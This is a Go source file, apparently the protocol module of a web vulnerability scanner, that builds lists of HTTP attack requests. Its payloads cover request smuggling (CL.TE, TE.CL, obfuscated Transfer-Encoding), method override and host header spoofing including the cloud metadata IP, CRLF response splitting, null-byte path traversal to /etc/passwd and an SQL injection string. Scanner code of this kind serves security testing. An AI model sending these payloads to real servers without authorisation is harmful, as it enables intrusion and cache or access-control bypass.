package attacks

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/cornerglitch/internal/scanner"
)

// ProtocolModule generates attack requests targeting HTTP protocol-level
// weaknesses: request smuggling, method override, host header attacks,
// HTTP version manipulation, oversized URLs, null bytes, CRLF injection,
// and Transfer-Encoding / Content-Length manipulation.
type ProtocolModule struct{}

func (m *ProtocolModule) Name() string     { return "protocol" }
func (m *ProtocolModule) Category() string { return "protocol" }

func (m *ProtocolModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.requestSmuggling()...)
	reqs = append(reqs, m.methodOverride()...)
	reqs = append(reqs, m.hostHeaderAttacks()...)
	reqs = append(reqs, m.httpVersionManipulation()...)
	reqs = append(reqs, m.oversizedURLs()...)
	reqs = append(reqs, m.nullBytes()...)
	reqs = append(reqs, m.crlfInjection()...)
	reqs = append(reqs, m.transferEncodingManipulation()...)
	reqs = append(reqs, m.contentLengthManipulation()...)

	return reqs
}

// ---------------------------------------------------------------------------
// Request Smuggling (CL.TE, TE.CL)
// ---------------------------------------------------------------------------

func (m *ProtocolModule) requestSmuggling() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Content-Length":    "6",
			"Transfer-Encoding": "chunked",
		},
		Body:        "0\r\n\r\nG",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Protocol",
		SubCategory: "request-smuggling-cl-te",
		Description: "CL.TE smuggling: Content-Length=6, chunked body ending early",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Content-Length":    "13",
			"Transfer-Encoding": "chunked",
		},
		Body:        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Protocol",
		SubCategory: "request-smuggling-cl-te",
		Description: "CL.TE smuggling: smuggle GET /admin in body",
	})

	// TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Content-Length":    "3",
			"Transfer-Encoding": "chunked",
		},
		Body:        "8\r\nSMUGGLED\r\n0\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Protocol",
		SubCategory: "request-smuggling-te-cl",
		Description: "TE.CL smuggling: chunked body with short Content-Length",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method: "POST",
		Path:   "/",
		Headers: map[string]string{
			"Content-Length":    "4",
			"Transfer-Encoding": "chunked",
		},
		Body:        "5c\r\nGPOST /admin HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Protocol",
		SubCategory: "request-smuggling-te-cl",
		Description: "TE.CL smuggling: embed POST /admin in chunked body",
	})

	// TE.TE: obfuscating Transfer-Encoding header
	obfuscations := []struct {
		headerVal string
		desc      string
	}{
		{"chunked", "Standard chunked"},
		{" chunked", "Leading space"},
		{"chunked ", "Trailing space"},
		{"Chunked", "Capitalized"},
		{"CHUNKED", "Uppercase"},
		{"chunked\t", "Trailing tab"},
		{"x]chunked", "Non-standard prefix"},
		{"chunked\r\nTransfer-Encoding: identity", "Double TE header"},
	}
	for _, o := range obfuscations {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Transfer-Encoding": o.headerVal,
				"Content-Length":    "5",
			},
			Body:        "0\r\n\r\n",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Protocol",
			SubCategory: "request-smuggling-te-te",
			Description: fmt.Sprintf("TE.TE obfuscation: %s", o.desc),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// HTTP Method Override
// ---------------------------------------------------------------------------

func (m *ProtocolModule) methodOverride() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	overrideHeaders := []string{
		"X-HTTP-Method-Override",
		"X-HTTP-Method",
		"X-Method-Override",
		"_method",
	}

	overrideMethods := []string{"PUT", "DELETE", "PATCH", "ADMIN"}
	paths := []string{"/", "/admin", "/api/v1/users", "/vuln/verb/admin"}

	for _, path := range paths {
		for _, header := range overrideHeaders {
			for _, method := range overrideMethods {
				reqs = append(reqs, scanner.AttackRequest{
					Method:      "POST",
					Path:        path,
					Headers:     map[string]string{header: method},
					Category:    "Protocol",
					SubCategory: "method-override",
					Description: fmt.Sprintf("Method override %s: %s to %s on %s", header, "POST", method, path),
				})
			}
		}
	}

	// Also test _method as a query parameter
	for _, path := range paths {
		for _, method := range overrideMethods {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        fmt.Sprintf("%s?_method=%s", path, method),
				Headers:     map[string]string{},
				Category:    "Protocol",
				SubCategory: "method-override",
				Description: fmt.Sprintf("Method override via _method param: %s on %s", method, path),
			})
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Host Header Attacks
// ---------------------------------------------------------------------------

func (m *ProtocolModule) hostHeaderAttacks() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/admin", "/login", "/vuln/host/check"}

	hostValues := []struct {
		host string
		desc string
	}{
		{"evil.com", "Attacker-controlled host"},
		{"localhost", "Localhost override"},
		{"127.0.0.1", "Loopback IP"},
		{"[::1]", "IPv6 loopback"},
		{"169.254.169.254", "Cloud metadata IP"},
		{"", "Empty host header"},
		{"evil.com:8080", "Host with port"},
		{"localhost:8766", "Internal dashboard host"},
		{"evil.com\r\nX-Injected: true", "CRLF in host header"},
	}

	for _, path := range paths {
		for _, h := range hostValues {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        path,
				Headers:     map[string]string{"Host": h.host},
				Category:    "Protocol",
				SubCategory: "host-header-attack",
				Description: fmt.Sprintf("Host header attack on %s: %s", path, h.desc),
			})
		}

		// X-Forwarded-Host abuse
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"X-Forwarded-Host": "evil.com"},
			Category:    "Protocol",
			SubCategory: "host-header-attack",
			Description: fmt.Sprintf("X-Forwarded-Host injection on %s", path),
		})

		// Multiple Host headers via X-Host
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Host":             "legitimate.com",
				"X-Forwarded-Host": "evil.com",
				"X-Host":           "evil.com",
				"X-Original-Host":  "evil.com",
			},
			Category:    "Protocol",
			SubCategory: "host-header-attack",
			Description: fmt.Sprintf("Multiple host headers on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// HTTP Version Manipulation
// ---------------------------------------------------------------------------

func (m *ProtocolModule) httpVersionManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// These use the HTTP/1.0 Connection header behavior
	paths := []string{"/", "/admin", "/api/v1/users"}

	for _, path := range paths {
		// HTTP/1.0 style (via Connection: close)
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Connection": "close"},
			Category:    "Protocol",
			SubCategory: "http-version",
			Description: fmt.Sprintf("HTTP/1.0 style request (Connection: close) on %s", path),
		})

		// HTTP/1.0 keep-alive
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Connection": "keep-alive"},
			Category:    "Protocol",
			SubCategory: "http-version",
			Description: fmt.Sprintf("HTTP/1.0 keep-alive request on %s", path),
		})

		// Downgrade attack indicator
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Upgrade": "h2c"},
			Category:    "Protocol",
			SubCategory: "http-version",
			Description: fmt.Sprintf("HTTP/2 cleartext upgrade attempt on %s", path),
		})

		// WebSocket upgrade attempt
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Upgrade":               "websocket",
				"Connection":            "Upgrade",
				"Sec-WebSocket-Version": "13",
				"Sec-WebSocket-Key":     "dGhlIHNhbXBsZSBub25jZQ==",
			},
			Category:    "Protocol",
			SubCategory: "http-version",
			Description: fmt.Sprintf("WebSocket upgrade on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Oversized URLs (8KB+)
// ---------------------------------------------------------------------------

func (m *ProtocolModule) oversizedURLs() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// 8KB path
	longPath := "/" + strings.Repeat("A", 8192)
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        longPath,
		Headers:     map[string]string{},
		Category:    "Protocol",
		SubCategory: "oversized-url",
		Description: "Oversized URL: 8KB path length",
	})

	// 8KB query string
	longQuery := "/?" + strings.Repeat("x="+strings.Repeat("A", 512)+"&", 16)
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        longQuery,
		Headers:     map[string]string{},
		Category:    "Protocol",
		SubCategory: "oversized-url",
		Description: "Oversized URL: 8KB+ query string",
	})

	// Many query parameters
	var params []string
	for i := 0; i < 500; i++ {
		params = append(params, fmt.Sprintf("p%d=v%d", i, i))
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/?" + strings.Join(params, "&"),
		Headers:     map[string]string{},
		Category:    "Protocol",
		SubCategory: "oversized-url",
		Description: "Oversized URL: 500 query parameters",
	})

	// Deeply nested path
	deepPath := strings.Repeat("/deep", 200)
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        deepPath,
		Headers:     map[string]string{},
		Category:    "Protocol",
		SubCategory: "oversized-url",
		Description: "Deeply nested path: 200 segments",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Null Bytes in Paths and Parameters
// ---------------------------------------------------------------------------

func (m *ProtocolModule) nullBytes() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/admin", "/api/v1/users", "/"}

	for _, path := range paths {
		// Null byte in path
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%00",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "null-byte-path",
			Description: fmt.Sprintf("Null byte at end of path: %s", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%00.html",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "null-byte-path",
			Description: fmt.Sprintf("Null byte extension bypass: %s.html", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%00.php",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "null-byte-path",
			Description: fmt.Sprintf("Null byte PHP extension bypass: %s.php", path),
		})

		// Null byte in parameter
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("%s?file=../../etc/passwd%%00", path),
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "null-byte-param",
			Description: fmt.Sprintf("Null byte path traversal in param on %s", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("%s?id=%s", path, url.QueryEscape("1\x00 OR 1=1")),
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "null-byte-param",
			Description: fmt.Sprintf("Null byte in SQL injection param on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// CRLF Injection in Headers and Paths
// ---------------------------------------------------------------------------

func (m *ProtocolModule) crlfInjection() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/vuln/crlf/header", "/login", "/search"}

	for _, path := range paths {
		// CRLF in path
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%0d%0aSet-Cookie:%20admin=true",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "crlf-path",
			Description: fmt.Sprintf("CRLF injection in URL path on %s: Set-Cookie", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%0d%0aX-Injected:%20true",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "crlf-path",
			Description: fmt.Sprintf("CRLF injection in URL path on %s: custom header", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "%0d%0a%0d%0a<html><body>injected</body></html>",
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "crlf-body",
			Description: fmt.Sprintf("CRLF injection with body on %s: HTTP response splitting", path),
		})

		// CRLF in query parameter
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        fmt.Sprintf("%s?name=%s", path, url.QueryEscape("test\r\nSet-Cookie: admin=true")),
			Headers:     map[string]string{},
			Category:    "Protocol",
			SubCategory: "crlf-param",
			Description: fmt.Sprintf("CRLF injection in query param on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Transfer-Encoding Manipulation
// ---------------------------------------------------------------------------

func (m *ProtocolModule) transferEncodingManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	manipulations := []struct {
		te   string
		desc string
	}{
		{"chunked", "Standard chunked encoding"},
		{"identity", "Identity encoding (no transformation)"},
		{"chunked, identity", "Chunked followed by identity"},
		{"identity, chunked", "Identity followed by chunked"},
		{"gzip", "GZIP encoding (unexpected for POST)"},
		{"deflate", "Deflate encoding"},
		{"compress", "Compress encoding"},
		{"chunked\r\nTransfer-Encoding: chunked", "Double chunked header"},
		{"\tchunked", "Tab-prefixed chunked"},
		{"xchunked", "Invalid encoding value"},
		{" ", "Single space encoding"},
		{"", "Empty encoding value"},
	}

	for _, te := range manipulations {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Transfer-Encoding": te.te,
			},
			Body:        "test=value",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Protocol",
			SubCategory: "transfer-encoding",
			Description: fmt.Sprintf("Transfer-Encoding manipulation: %s", te.desc),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Content-Length Manipulation
// ---------------------------------------------------------------------------

func (m *ProtocolModule) contentLengthManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	manipulations := []struct {
		cl   string
		body string
		desc string
	}{
		{"-1", "test=value", "Negative Content-Length"},
		{"0", "test=value", "Zero Content-Length with body"},
		{"999999", "test=value", "Content-Length much larger than body"},
		{"1", "test=value", "Content-Length smaller than body"},
		{"4294967295", "a", "Content-Length near UINT32_MAX"},
		{"9999999999999999999", "a", "Content-Length overflow"},
		{"0x10", "1234567890123456", "Hex Content-Length"},
		{"1e2", "a", "Scientific notation Content-Length"},
		{" 10", "1234567890", "Leading space in Content-Length"},
		{"10 ", "1234567890", "Trailing space in Content-Length"},
		{"10\r\nContent-Length: 0", "1234567890", "Double Content-Length header"},
	}

	for _, cl := range manipulations {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   "/",
			Headers: map[string]string{
				"Content-Length": cl.cl,
			},
			Body:        cl.body,
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Protocol",
			SubCategory: "content-length",
			Description: fmt.Sprintf("Content-Length manipulation: %s", cl.desc),
		})
	}

	return reqs
}
